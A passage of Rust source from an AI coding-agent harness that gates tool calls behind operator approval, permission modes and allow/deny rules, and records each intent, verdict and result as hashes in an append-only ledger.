//! Tool-call approval, ledger evidence, pure execution (DR-19, DR-20 §2.6/§2.7).
//!
//! Execution ordering is fail-closed:
//!   ToolIntent append+fsync -> approval verdict append+fsync -> pure executor
//!   -> ToolResult append+fsync.
//! The ledger receives only hashes/sizes; never raw arguments or result bytes.
//!
//! Approval is behind an `ApprovalChannel` trait (DR-20 §2.6):
//! - `StdApprovalChannel` wraps the existing blocking stdin reader (REPL).
//! - `TuiApprovalChannel` (in hud-tui) posts to the bus and parks on a response.
//! - The `R` verdict (DR-20 §2.7) grants session-scoped per-tool auto-approval.

use orbit_ledger::event::{LedgerEvent, ToolIntent, ToolResult, ToolVerdict};
use orbit_ledger::LedgerWriter;
use sha2::{Digest, Sha256};
use std::path::Path;

const MAX_ARGUMENT_BYTES: usize = 64 * 1024;
const MAX_RESULT_BYTES: usize = 64 * 1024;

/// The operator's verdict on a pending tool call (DR-20 §2.7).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApprovalVerdict {
    /// Allow this one call.
    AllowOnce,
    /// Deny this call.
    Deny,
    /// Always-allow this tool for the rest of the session (session-scoped,
    /// per-tool-name, ledger-logged, revocable). Does NOT bypass `is_known_tool`.
    /// The whole tool: kept as `R` for one release beside the narrower
    /// grants below.
    AllowSession,
    /// `s`: allow the calls that match the rule the card offered
    /// (`Bash(cargo test *)`), for this session.
    AllowRuleSession,
    /// `a`: the same rule, and remember it in this folder's local settings
    /// so later sessions need not ask.
    AllowRuleAlways,
}

thread_local! {
    /// True when the front-end is a plain surface (REPL / non-TTY) and
    /// stdout lines are safe. The TUI leaves it false — its worker threads
    /// must never print to the alt screen.
    static PLAIN_OUTPUT: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
}

/// Enable plain-grammar stdout lines (REPL / non-TTY front-ends).
pub fn enable_plain_output() {
    PLAIN_OUTPUT.with(|c| c.set(true));
}

fn plain_output_enabled() -> bool {
    PLAIN_OUTPUT.with(|c| c.get())
}

/// Current wall-clock time as HH:MM for the plain grammar's line stamps.
fn hhmm_now() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let (h, m) = ((secs / 3600) % 24, (secs / 60) % 60);
    format!("{h:02}:{m:02}")
}

/// The rule the card offers to remember for a call: not the whole tool
/// (`R`), but this kind of call. Derived from the call by the backend, so
/// the card shows exactly what `s` and `a` would grant (design law 6).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GrantOffer {
    /// The rule as it is written in a settings file: `Bash(cargo test *)`.
    pub rule: String,
    /// The tool the rule is about, and its pattern: `Bash`, `cargo test *`.
    pub tool: String,
    pub pattern: String,
    /// Whether `a` can save it: the folder is trusted, so its local
    /// settings are read back.
    pub can_save: bool,
}

/// A pending tool call awaiting approval — the data the channel sees.
#[derive(Debug, Clone)]
pub struct ApprovalRequest {
    /// Used by `TuiApprovalChannel` to correlate the modal with the call.
    #[allow(dead_code)] // wired in PR-D (TUI approval modal)
    pub call_id: String,
    /// Used by `TuiApprovalChannel` to check R-grants per tool.
    #[allow(dead_code)] // wired in PR-D (TUI approval modal)
    pub tool_name: String,
    pub summary: String,
    /// Structured risk classification (backend-authoritative; the UI renders
    /// it, never infers it). §6.15: the risk badge lives here so the
    /// approval card can draw ▰▰▱ without classifying on its own.
    pub risk: crate::tools::RiskLevel,
    /// The lines the call would change, for the card (an Edit's removed
    /// and added lines) — from the call's own arguments.
    pub preview: Vec<String>,
    /// What `s` and `a` would remember, when there is something narrower
    /// than the whole tool to offer.
    pub grant: Option<GrantOffer>,
}

/// Approval channel — how the operator is asked to approve a tool call.
/// The default impl (`StdApprovalChannel`) wraps the existing stdin reader;
/// the TUI provides its own that posts to the event bus.
pub trait ApprovalChannel: Send {
    /// Ask the operator to approve a tool call. Returns the verdict.
    /// The `auto_tools` flag is true when `--auto-tools` was granted up front
    /// (in which case the channel may skip the prompt and return `AllowOnce`).
    fn ask(&mut self, req: &ApprovalRequest, auto_tools: bool) -> ApprovalVerdict;

    /// The note typed with a denial ("use `make test` instead"), taken
    /// once after `ask` returned `Deny`. It goes to the model as the
    /// reason; it is never written to the ledger.
    fn take_note(&mut self) -> Option<String> {
        None
    }
}

/// The standard stdin-based approval channel (REPL behavior, unchanged).
pub struct StdApprovalChannel {
    interactive: bool,
    note: Option<String>,
}

impl StdApprovalChannel {
    pub fn new(interactive: bool) -> Self {
        Self {
            interactive,
            note: None,
        }
    }
}

impl ApprovalChannel for StdApprovalChannel {
    fn take_note(&mut self) -> Option<String> {
        self.note.take()
    }

    fn ask(&mut self, req: &ApprovalRequest, auto_tools: bool) -> ApprovalVerdict {
        if auto_tools {
            return ApprovalVerdict::AllowOnce;
        }
        if !self.interactive {
            return ApprovalVerdict::Deny;
        }
        // Plain grammar (§11.4): words not glyphs, risk in words, the
        // choices spelled out. Same grammar as the TUI's copy mode.
        use std::io::Write;
        let rules = match &req.grant {
            Some(g) if g.can_save => {
                format!(
                    "s allow {} this session, a always allow {}, ",
                    g.rule, g.rule
                )
            }
            Some(g) => format!("s allow {} this session, ", g.rule),
            None => String::new(),
        };
        print!(
            "approval needed: {} ({} risk). y allow once, {rules}R allow all {} this session, n deny: ",
            req.summary,
            req.risk.as_str(),
            req.tool_name
        );
        let _ = std::io::stdout().flush();
        let mut line = String::new();
        if std::io::stdin().read_line(&mut line).is_err() {
            return ApprovalVerdict::Deny;
        }
        // `R` is capital in the card; the line reader folds case, and a
        // lower-case `r` has always meant the same thing here.
        let answer = line.trim().to_ascii_lowercase();
        match answer.as_str() {
            "y" | "yes" => ApprovalVerdict::AllowOnce,
            "r" => ApprovalVerdict::AllowSession,
            "s" if req.grant.is_some() => ApprovalVerdict::AllowRuleSession,
            "a" if req.grant.is_some() => ApprovalVerdict::AllowRuleAlways,
            _ => {
                // `n use make instead`: whatever follows the n is the note.
                self.note = line
                    .trim()
                    .strip_prefix(['n', 'N'])
                    .map(str::trim)
                    .filter(|n| !n.is_empty())
                    .map(str::to_string);
                ApprovalVerdict::Deny
            }
        }
    }
}

/// A session-scoped set of tools that have been R-granted (always-allow).
/// Stored in the harness; checked before calling `approval.ask`.
#[derive(Debug, Clone, Default)]
pub struct AutoGrants {
    tools: std::collections::HashSet<String>,
    /// Allow rules granted with `s` or `a` this session: this kind of
    /// call, not the whole tool. Read like a settings rule, so a Bash rule
    /// never covers a chained line.
    rules: Vec<orbit_tools::permissions::PermissionRule>,
}

/// The session's permission scope (S5): the mode and the operator's
/// explicit allow/disallow lists, owned by the session and passed
/// explicitly — never process-wide environment variables, which are
/// not thread-safe (subagents run nested turns), can't change at
/// runtime, and leak into every Bash child.
#[derive(Debug, Clone, Default)]
pub struct PermissionScope {
    /// `--permission-mode` (default, acceptEdits, plan, dontAsk, bypass).
    pub mode: orbit_tools::permissions::PermissionMode,
    /// `--allowedTools`: an explicit scope — only what it names may run.
    pub allowlist: Option<Vec<String>>,
    /// `--disallowedTools`: deny rules on top of the scope.
    pub disallowlist: Vec<String>,
}

impl PermissionScope {
    /// Build from the CLI flags (`--permission-mode`, `--allowedTools`,
    /// `--disallowedTools`), comma-separated as on the command line.
    pub fn from_flags(mode: Option<&str>, allow: Option<&str>, deny: Option<&str>) -> Self {
        let mode = mode
            .and_then(orbit_tools::permissions::PermissionMode::from_config)
            .unwrap_or_default();
        let allowlist = allow.map(|l| {
            l.split(',')
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .map(String::from)
                .collect::<Vec<_>>()
        });
        let disallowlist = deny
            .map(|l| {
                l.split(',')
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .map(String::from)
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();
        Self {
            mode,
            allowlist,
            disallowlist,
        }
    }
}

impl AutoGrants {
    pub fn new() -> Self {
        Self::default()
    }

    /// True if this tool name has been R-granted.
    pub fn is_granted(&self, tool_name: &str) -> bool {
        self.tools.contains(tool_name)
    }

    /// Grant always-allow for this tool (session-scoped).
    pub fn grant(&mut self, tool_name: &str) {
        self.tools.insert(tool_name.to_string());
    }

    /// Grant a rule for the rest of the session: `Bash` / `cargo test *`.
    pub fn grant_rule(&mut self, tool: &str, pattern: &str) {
        let rule = orbit_tools::permissions::PermissionRule {
            tool: tool.to_string(),
            pattern: pattern.to_string(),
            effect: orbit_tools::permissions::RuleEffectSerde::Allow,
        };
        if !self.rules.contains(&rule) {
            self.rules.push(rule);
        }
    }

    /// Does a rule granted this session cover this call's key?
    pub fn rule_granted(&self, tool: &str, argument: &str) -> bool {
        self.rules
            .iter()
            .any(|r| r.tool == tool && orbit_tools::permissions::rule_matches(r, argument))
    }

    /// Revoke the R-grant for this tool (e.g. operator pressed `n`).
    pub fn revoke(&mut self, tool_name: &str) {
        self.tools.remove(tool_name);
    }

    /// Revoke all grants (e.g. `/revoke` command).
    #[allow(dead_code)] // wired to `/revoke` and the TUI status control in PR-D
    pub fn revoke_all(&mut self) {
        self.tools.clear();
        self.rules.clear();
    }

    /// List currently granted tool names (for the status bar display).
    #[allow(dead_code)] // wired to the TUI status bar in PR-D
    pub fn granted_tools(&self) -> Vec<&str> {
        self.tools.iter().map(String::as_str).collect()
    }
}

/// Execute one pending call with approval + ledger evidence.
///
/// A real file change from a checkpointed write (M11): true counts and
/// bounded hunks for the Changes panel — computed from the
/// checkpoint's before/after bytes, never invented.
pub struct FileChange {
    pub path: String,
    pub added: u32,
    pub removed: u32,
    pub checkpoint_id: String,
    pub hunks: Option<Vec<orbit_frontend_protocol::DiffHunk>>,
}

/// The `approval` channel is injected — `StdApprovalChannel` for the REPL,
/// `TuiApprovalChannel` for the TUI. The `grants` set tracks session-scoped
/// R-grants so previously-approved tools skip the prompt.
///
/// Returns the tool's payload plus, when the call was a successful
/// checkpointed write, the real file change (M11): true counts and
/// bounded hunks computed from the checkpoint's before/after bytes.
#[allow(clippy::too_many_arguments)]
pub fn execute_call(
    home: &Path,
    session_id: &str,
    decision_id: &str,
    call: &crate::PendingToolCall,
    auto_tools: bool,
    interactive: bool,
    approval: &mut dyn ApprovalChannel,
    grants: &mut AutoGrants,
    // The SESSION's permission scope (S5): mode + operator lists,
    // owned by the caller and passed explicitly — env vars are gone.
    scope: &PermissionScope,
    // The SESSION's tool context (B2): cloned per call, but the clone
    // shares the read-before-edit map, so Read's record survives to
    // Edit. Callers build this once per session.
    tool_cx: &orbit_tools::ToolContext,
) -> Result<(String, Option<FileChange>), String> {
    if call.arguments.len() > MAX_ARGUMENT_BYTES {
        return Ok((tool_error("tool arguments exceed 64 KiB"), None));
    }
    let arguments_sha256 = hex::encode(Sha256::digest(&call.arguments));
    let mut writer = LedgerWriter::open(&home.join("ledger"), "orbit-tool".into(), "0.1.0")
        .map_err(|e| format!("open ledger: {e}"))?;
    let intent_digest = writer
        .append(LedgerEvent::ToolIntent(ToolIntent {
            session_id: session_id.into(),
            decision_id: decision_id.into(),
            call_id: call.id.clone(),
            tool_name: call.name.clone(),
            arguments_sha256,
            arguments_bytes: call.arguments.len() as u64,
        }))
        .map_err(|e| format!("record tool intent: {e}"))?;
    tool_cx.note_ledger(orbit_tools::LedgerNote {
        kind: "intent",
        target: safe_call_summary(call),
        fact: "requested".to_string(),
        digest: intent_digest,
    });
    // LedgerWriter::append is the durability boundary (append+fsync), so no
    // execution may happen before the call returns successfully.

    let known = crate::tools::is_known_tool(&call.name);

    // B4: layer 2's pattern verdict, computed once here so headless
    // runs don't blanket-deny calls the mode/rules allow. The channel
    // is only asked when BOTH layers say ask.
    let args_preview =
        crate::tools::parse_arguments(&call.arguments).unwrap_or(serde_json::Value::Null);
    let pattern_verdict = pattern_layer_verdict(home, scope, &call.name, &args_preview);

    // Determine the verdict:
    // 1. Unknown tool → always deny (fail-closed, even with --auto-tools / R).
    // 2. Persistent deny rule → deny, no prompt.
    // 3. A deny rule or plan mode in the pattern layer → deny. No consent
    //    and no grant outranks it: this check comes BEFORE them, so the
    //    ledger records a refusal as a refusal (the tool layer would have
    //    refused it anyway).
    // 4. Persistent allow rule → allow once, no prompt (durable R-grant).
    // 5. --auto-tools → allow once (up-front consent for pure built-ins).
    // 6. Session grant (the whole tool with R, or a rule with s / a)
    //    → allow once.
    // 7. Otherwise → ask the approval channel.
    // Unknown tools always deny (fail-closed, even with --auto-tools / R).
    // Persistent rules (permissions.toml) sit between unknown-tool denial
    // and everything else — deny rules are a durable fail-closed, allow
    // rules a durable consent. A malformed rules file degrades to ask
    // (never silently allow).
    let rules = crate::permissions::PermissionRules::load(home).unwrap_or_else(|e| {
        eprintln!("warning: permissions.toml: {e} (falling back to ask)");
        crate::permissions::PermissionRules::default()
    });
    let rule_verdict = rules.verdict(&call.name);
    // The call's permission key, for rules granted this session.
    let call_key = orbit_tools::registry()
        .into_iter()
        .find(|t| t.name() == call.name)
        .map(|t| t.permission_key(&args_preview));
    let rule_granted = call_key
        .as_ref()
        .is_some_and(|k| grants.rule_granted(&k.tool, &k.pattern));
    let mut offer: Option<GrantOffer> = None;
    let verdict = if !known || rule_verdict == crate::permissions::RuleVerdict::Deny {
        ApprovalVerdict::Deny
    } else if matches!(pattern_verdict, PatternOutcome::Deny(_)) {
        // A pattern deny rule (or plan mode refusing a write) is final.
        ApprovalVerdict::Deny
    } else if rule_verdict == crate::permissions::RuleVerdict::Allow
        || auto_tools
        || grants.is_granted(&call.name)
        || rule_granted
        // B4: the mode/pattern layer allows it outright (read-only in
        // default mode, edits in acceptEdits, an allow rule from
        // --allowedTools or settings.toml).
        || pattern_verdict == PatternOutcome::Allow
    {
        ApprovalVerdict::AllowOnce
    } else {
        // E9: PermissionRequest fires when the operator is asked to
        // decide (hooks can observe, not replace, the ask).
        let hooks_pr = orbit_engine::hooks::Hooks::load(home, project_trusted_home(home));
        let _ = hooks_pr.fire(
            orbit_engine::hooks::HookEvent::PermissionRequest,
            &serde_json::json!({
                "tool": call.name,
                "summary": safe_call_summary(call),
            }),
        );
        offer = grant_offer(home, scope, &tool_cx.working_dir, &call.name, &args_preview);
        approval.ask(
            &ApprovalRequest {
                call_id: call.id.clone(),
                tool_name: call.name.clone(),
                summary: safe_call_summary(call),
                risk: crate::tools::call_risk(&call.name, &args_preview),
                preview: crate::tools::approval_preview(&call.name, &args_preview),
                grant: offer.clone(),
            },
            auto_tools,
        )
    };

    // Apply the grant's side effects. `s` and `a` remember the rule the
    // card offered (nothing, if none was: the key did not mean anything);
    // `a` also writes it to the folder's local settings, and if that
    // cannot be done the rule is still good for this session and the
    // record says so.
    let mut saved: Option<bool> = None;
    let allowed = match verdict {
        ApprovalVerdict::AllowOnce => true,
        ApprovalVerdict::AllowSession => {
            grants.grant(&call.name);
            true
        }
        ApprovalVerdict::AllowRuleSession | ApprovalVerdict::AllowRuleAlways => {
            if let Some(o) = &offer {
                grants.grant_rule(&o.tool, &o.pattern);
                if verdict == ApprovalVerdict::AllowRuleAlways {
                    saved = Some(o.can_save && save_rule(&tool_cx.working_dir, &o.rule).is_ok());
                }
            }
            true
        }
        ApprovalVerdict::Deny => {
            // Pressing `n` on a previously-R-granted tool revokes the grant.
            grants.revoke(&call.name);
            false
        }
    };
    // The note typed with a denial: the model's reason, not the ledger's.
    let note = if allowed {
        None
    } else {
        approval.take_note().filter(|n| !n.trim().is_empty())
    };

    let reason = if !known {
        "unknown tool (deny-by-default)"
    } else if rule_verdict == crate::permissions::RuleVerdict::Deny {
        "denied by persistent rule (permissions.toml)"
    } else if let PatternOutcome::Deny(r) = &pattern_verdict {
        // B4: the mode/pattern layer denied (a deny rule, or plan mode
        // refusing a write) — its reason is the honest one.
        r
    } else if rule_verdict == crate::permissions::RuleVerdict::Allow {
        "allowed by persistent rule (permissions.toml)"
    } else if auto_tools {
        "allowed by --auto-tools up-front consent"
    } else if grants.is_granted(&call.name) && !matches!(verdict, ApprovalVerdict::Deny) {
        "allowed by session R-grant"
    } else if rule_granted {
        "allowed by a rule granted this session"
    } else if !interactive && !auto_tools {
        // B4: headless is not an error — the call needs one of the
        // headless allow paths (--auto-tools, a rule, --allowedTools)
        // and the denial says so.
        "non-interactive tool call requires --auto-tools or an allow rule (--allowedTools / settings.toml)"
    } else if verdict == ApprovalVerdict::AllowRuleSession {
        "operator approved: rule granted for this session"
    } else if verdict == ApprovalVerdict::AllowRuleAlways {
        match saved {
            Some(true) => "operator approved: rule saved to local settings",
            _ => "operator approved: rule granted for this session (could not be saved)",
        }
    } else if allowed {
        "operator approved"
    } else if note.is_some() {
        "operator denied (with a note)"
    } else {
        "operator denied"
    };
    let verdict_digest = writer
        .append(LedgerEvent::ToolVerdict(ToolVerdict {
            session_id: session_id.into(),
            decision_id: decision_id.into(),
            call_id: call.id.clone(),
            tool_name: call.name.clone(),
            allowed,
            reason: reason.into(),
        }))
        .map_err(|e| format!("record tool verdict: {e}"))?;
    tool_cx.note_ledger(orbit_tools::LedgerNote {
        kind: "verdict",
        target: safe_call_summary(call),
        fact: format!("{} — {reason}", if allowed { "allowed" } else { "denied" }),
        digest: verdict_digest,
    });

    // Plain grammar (§11.4): the verdict is one stamped line on stdout —
    // words not glyphs, greppable, screen-reader friendly. Only in plain
    // mode: the TUI worker shares this code path, and a println from it
    // would scribble on the alternate screen.
    if plain_output_enabled() {
        println!(
            "{} tool {} {}: {}",
            hhmm_now(),
            call.name,
            safe_call_summary(call),
            if allowed {
                "allowed by you"
            } else {
                "denied by you"
            }
        );
    }

    // Release the ledger's single-writer lock BEFORE execution: a
    // nested session (the Task tool spawning a subagent, phase 5) opens
    // its own writer for the subagent's calls, and holding this lock
    // across the dispatch deadlocked the subagent at boot (E0719). The
    // verdict is durably recorded above; the result reopens below.
    drop(writer);

    if !allowed {
        let output = match &note {
            Some(n) => tool_denial(&format!("denied by the operator: {n}")),
            None => tool_denial(reason),
        };
        // D9: a denial is not an error — audits must be able to tell an
        // operator refusal apart from a tool that ran and failed.
        record_result(
            home,
            session_id,
            decision_id,
            call,
            "denied",
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    let args = match crate::tools::parse_arguments(&call.arguments) {
        Ok(v) => v,
        Err(e) => {
            let output = tool_error(&e);
            record_result(
                home,
                session_id,
                decision_id,
                call,
                "error",
                &output,
                tool_cx,
            )?;
            return Ok((output, None));
        }
    };

    // The Skill tool (phase 5): load a body on demand.
    if call.name == "Skill" {
        let output = match args.get("name").and_then(|v| v.as_str()) {
            Some(name) => match crate::tools::execute_skill(home, name) {
                Ok(v) => serde_json::json!({ "ok": true, "result": v }).to_string(),
                Err(e) => tool_error(&e),
            },
            None => tool_error("Skill requires 'name'"),
        };
        let status = if orbit_tools::result_is_denial(&output) {
            "denied"
        } else if orbit_tools::result_is_error(&output) {
            "error"
        } else {
            "ok"
        };
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    // The Task tool (phase 5) and its Agent alias: spawn a subagent.
    // The subagent needs the session's TurnConfig — derived from the
    // same environment the front-ends use, so provider/gate/model
    // match the parent. `Agent` is the current Claude Code name; both
    // shapes route to the one runner.
    if call.name == "Task" || call.name == "Agent" {
        let agent = args
            .get("agent")
            .or_else(|| args.get("agent_type"))
            .and_then(|v| v.as_str())
            .unwrap_or("general");
        let prompt = args
            .get("prompt")
            .or_else(|| args.get("description"))
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if prompt.is_empty() {
            let output = tool_error("Task/Agent requires a 'prompt'");
            record_result(
                home,
                session_id,
                decision_id,
                call,
                "error",
                &output,
                tool_cx,
            )?;
            return Ok((output, None));
        }
        let turn_config = session_subagent_config(tool_cx, home);
        let observer = tool_cx.ext::<SubagentObserver>();
        let output = match crate::tools::execute_task(
            home,
            agent,
            prompt,
            &turn_config,
            approval,
            tool_cx.cancel_check(),
            observer.as_deref().map(|o| &*o.0),
        ) {
            Ok(v) => serde_json::json!({ "ok": true, "result": v }).to_string(),
            Err(e) => tool_error(&e),
        };
        let status = if orbit_tools::result_is_denial(&output) {
            "denied"
        } else if orbit_tools::result_is_error(&output) {
            "error"
        } else {
            "ok"
        };
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    // MCP tools (phase 5): mcp__<server>__<tool> — spawn, call, scan.
    if call.name.starts_with("mcp__") {
        let output = execute_mcp(home, call, &args);
        let status = if orbit_tools::result_is_denial(&output) {
            "denied"
        } else if orbit_tools::result_is_error(&output) {
            "error"
        } else {
            "ok"
        };
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    // Wave 1 tools (Read/Write/Edit/Glob/Grep/Bash/TaskStop) run
    // through the orbit-tools registry: the real implementations, the
    // permission layer (modes + pattern rules), the deny-read list and
    // the secret scanner on every result (review blocker 1).
    if orbit_tools::is_wave1(&call.name) {
        let (output, file_change) = execute_wave1(home, scope, call, &args, tool_cx);
        let status = if orbit_tools::result_is_denial(&output) {
            "denied"
        } else if orbit_tools::result_is_error(&output) {
            "error"
        } else {
            "ok"
        };
        // E9: PostToolUseFailure fires for the error path (the plain
        // PostToolUse fires inside execute_wave1 with ok=true/false).
        // A denial (status "denied") is not a failure — the tool never
        // ran (D9), and PermissionRequest already covered the moment.
        if status == "error" {
            let hooks = orbit_engine::hooks::Hooks::load(home, project_trusted_home(home));
            let _ = hooks.fire(
                orbit_engine::hooks::HookEvent::PostToolUseFailure,
                &serde_json::json!({ "tool": call.name, "ok": false }),
            );
        }
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, file_change));
    }

    let result = crate::tools::execute(&call.name, &args);
    let output = match result {
        Ok(v) => serde_json::json!({ "ok": true, "result": v }).to_string(),
        Err(e) => tool_error(&e),
    };
    if output.len() > MAX_RESULT_BYTES {
        let truncated = tool_error("tool result exceeds 64 KiB");
        record_result(
            home,
            session_id,
            decision_id,
            call,
            "error",
            &truncated,
            tool_cx,
        )?;
        return Ok((truncated, None));
    }
    let status = if orbit_tools::result_is_denial(&output) {
        "denied"
    } else if orbit_tools::result_is_error(&output) {
        "error"
    } else {
        "ok"
    };
    record_result(
        home,
        session_id,
        decision_id,
        call,
        status,
        &output,
        tool_cx,
    )?;
    // Legacy tools (Bash/Glob/...) don't snapshot, so no diff — only
    // checkpointed writes (Write/Edit through execute_wave1) carry a
    // FileChange.
    Ok((output, None))
}

/// The rule `s` and `a` would remember for this call, or None when there
/// is nothing narrower than the whole tool to offer.
///
/// Offered only where the card asks at all (default and acceptEdits: in
/// the other modes nothing is asked, so nothing is remembered). For a
/// Bash command the rule comes from [`orbit_tools::shellcmd::grant_pattern`]
/// (a wildcard only for the verb of a known multiplexer, the exact line
/// otherwise); for a tool keyed by a path or a host it is exactly that
/// key. A tool with no key, or a key containing a `*` (which the rule
/// language would read as a wildcard), offers nothing.
fn grant_offer(
    home: &Path,
    scope: &PermissionScope,
    project: &Path,
    tool_name: &str,
    args: &serde_json::Value,
) -> Option<GrantOffer> {
    use orbit_tools::permissions::{rule_matches, PermissionMode, PermissionRule, RuleEffectSerde};
    if !matches!(
        scope.mode,
        PermissionMode::Default | PermissionMode::AcceptEdits
    ) {
        return None;
    }
    let tool = orbit_tools::registry()
        .into_iter()
        .find(|t| t.name() == tool_name)?;
    let key = tool.permission_key(args);
    let pattern = if key.tool == "Bash" {
        orbit_tools::shellcmd::grant_pattern(&key.pattern)?.0
    } else if key.pattern.is_empty() || key.pattern.contains('*') {
        return None;
    } else {
        key.pattern.clone()
    };
    // The offer must cover the call it is offered for, or it is a lie.
    let rule = PermissionRule {
        tool: key.tool.clone(),
        pattern: pattern.clone(),
        effect: RuleEffectSerde::Allow,
    };
    if !rule_matches(&rule, &key.pattern) {
        return None;
    }
    Some(GrantOffer {
        rule: format!("{}({})", key.tool, pattern),
        tool: key.tool,
        pattern,
        can_save: orbit_tools::permissions::FolderTrust::new(home.to_path_buf())
            .is_trusted(project),
    })
}

/// Write an `a` grant to the project's local settings. The project is the
/// session's working directory (the one `load_rules` reads from).
fn save_rule(project: &Path, rule: &str) -> Result<(), String> {
    orbit_tools::executor::add_local_allow_rule(project, rule).map(|_| ())
}

/// Layer-2 outcome for the pre-check (B4): what would the mode/pattern
/// rules say about this call?
#[derive(PartialEq)]
enum PatternOutcome {
    Allow,
    Ask,
    Deny(String),
}

fn pattern_layer_verdict(
    home: &Path,
    scope: &PermissionScope,
    tool_name: &str,
    args: &serde_json::Value,
) -> PatternOutcome {
    use orbit_tools::permissions::{evaluate, parse_rule, RuleEffectSerde, Verdict};

    let mut rules = orbit_tools::executor::load_rules(home);
    // An explicit operator allowlist (--allowedTools / settings) is a
    // SCOPE statement: only what it names may run. The flag is tracked
    // separately so the pure-built-in bypass below cannot punch
    // through it (gate 6: a CI allowlist without calculator must deny
    // calculator with exit 2, not let the built-in run).
    if let Some(list) = &scope.allowlist {
        for entry in list {
            if let Some(r) = parse_rule(entry, RuleEffectSerde::Allow) {
                rules.rules.push(r);
            }
        }
    }
    for entry in &scope.disallowlist {
        if let Some(r) = parse_rule(entry, RuleEffectSerde::Deny) {
            rules.rules.push(r);
        }
    }
    let Some(tool) = orbit_tools::registry()
        .into_iter()
        .find(|t| t.name() == tool_name)
    else {
        // Not a registry tool. Pure built-ins (calculator, session
        // lookups) are safe by construction — UNLESS the operator
        // pinned an explicit allowlist, which names the whole scope
        // (a built-in outside it is outside the scope, full stop).
        if crate::tools::builtin_tools()
            .iter()
            .any(|t| t.name == tool_name)
        {
            if scope.allowlist.is_some() {
                return PatternOutcome::Ask;
            }
            return PatternOutcome::Allow;
        }
        return PatternOutcome::Ask;
    };
    let key = tool.permission_key(args);
    let is_ro_cmd = tool_name == "Bash"
        && orbit_tools::bash::is_readonly_command(
            args.get("command").and_then(|v| v.as_str()).unwrap_or(""),
        );
    match evaluate(
        scope.mode,
        &rules,
        &key.tool,
        &key.pattern,
        tool.read_only(),
        is_ro_cmd,
    ) {
        Verdict::Allow => PatternOutcome::Allow,
        Verdict::Ask => PatternOutcome::Ask,
        Verdict::Deny(reason) => PatternOutcome::Deny(reason),
    }
}

/// Display-safe summary of a tool call (name + argument keys only).
fn safe_call_summary(call: &crate::PendingToolCall) -> String {
    let args = crate::tools::parse_arguments(&call.arguments).unwrap_or(serde_json::Value::Null);
    crate::tools::safe_call_summary(&call.name, &args)
}

/// Open the ledger writer for one append (the single-writer lock is
/// held only for the append, then released — nested sessions open
/// their own between the parent's records).
fn reopen_writer(home: &Path) -> Result<LedgerWriter, String> {
    LedgerWriter::open(&home.join("ledger"), "orbit-tool".into(), "0.1.0")
        .map_err(|e| format!("open ledger: {e}"))
}

fn record_result(
    home: &Path,
    session_id: &str,
    decision_id: &str,
    call: &crate::PendingToolCall,
    status: &str,
    output: &str,
    tool_cx: &orbit_tools::ToolContext,
) -> Result<(), String> {
    let mut writer = reopen_writer(home)?;
    let head = writer
        .append(LedgerEvent::ToolResult(ToolResult {
            session_id: session_id.into(),
            decision_id: decision_id.into(),
            call_id: call.id.clone(),
            tool_name: call.name.clone(),
            status: status.into(),
            output_sha256: hex::encode(Sha256::digest(output.as_bytes())),
            output_bytes: output.len() as u64,
        }))
        .map_err(|e| format!("record tool result: {e}"))?;
    // The proof surface's heartbeat (M19): every append is announced to
    // the front-end where the writer lives; the ledger crate itself
    // stays a pure library.
    tool_cx.note_ledger(orbit_tools::LedgerNote {
        kind: "result",
        target: safe_call_summary(call),
        fact: status.to_string(),
        digest: head,
    });
    Ok(())
}

/// Extract a readable message from a caught panic payload
/// (String or &str; anything else becomes "tool panicked").
fn panic_message(payload: &Box<dyn std::any::Any + Send>) -> String {
    if let Some(s) = payload.downcast_ref::<&str>() {
        (*s).to_string()
    } else if let Some(s) = payload.downcast_ref::<String>() {
        s.clone()
    } else {
        "tool panicked".to_string()
    }
}

/// S3: the standing refusal for an unrunnable sandbox.
fn sandbox_refusal() -> String {
    tool_denial(
        "refused: the shell sandbox is unavailable on this machine \
(bubblewrap missing); set ORBIT_ALLOW_UNSANDBOXED_BASH=1 to run Bash unsandboxed",
    )
}

fn tool_error(msg: &str) -> String {
    serde_json::json!({ "ok": false, "error": msg }).to_string()
}

/// A round's tools are about to run: make the turn's token the current
/// cancel check of this session's tool context. Every executor's
/// `begin_cancel_scope` is this; `end_cancel_scope` is `pop_cancel_check`.
pub fn begin_cancel_scope(cx: &orbit_tools::ToolContext, token: &orbit_provider_http::CancelToken) {
    let token = token.clone();
    cx.push_cancel_check(std::sync::Arc::new(move || token.is_cancelled()));
}

/// The answer for a call that never ran because the person pressed Esc
/// first. Typed (`error == "cancelled by user"`), so a front-end shows
/// "⊘ cancelled", not a failure, and the transcript stays valid.
pub fn cancelled_result(call: &crate::PendingToolCall) -> orbit_engine::ToolRoundResult {
    orbit_engine::ToolRoundResult {
        call_id: call.id.clone(),
        content: tool_error("cancelled by user"),
    }
}

/// Run a round's calls in order. Once the turn is cancelled, the calls
/// that have not started are answered "cancelled by user" WITHOUT
/// running: after the person says stop nothing else executes (a second
/// Bash command used to run to completion, because only the one in
/// flight was killed). `on_skip` lets a front-end settle the skipped
/// call's card.
pub fn run_until_cancelled(
    cx: &orbit_tools::ToolContext,
    calls: &[crate::PendingToolCall],
    mut run: impl FnMut(&crate::PendingToolCall) -> orbit_engine::ToolRoundResult,
    mut on_skip: impl FnMut(&crate::PendingToolCall),
) -> Vec<orbit_engine::ToolRoundResult> {
    let mut results = Vec::with_capacity(calls.len());
    for call in calls {
        if cx.is_cancelled() {
            on_skip(call);
            results.push(cancelled_result(call));
        } else {
            results.push(run(call));
        }
    }
    results
}

/// A permission refusal (C4): the typed `denied` flag marks "policy or
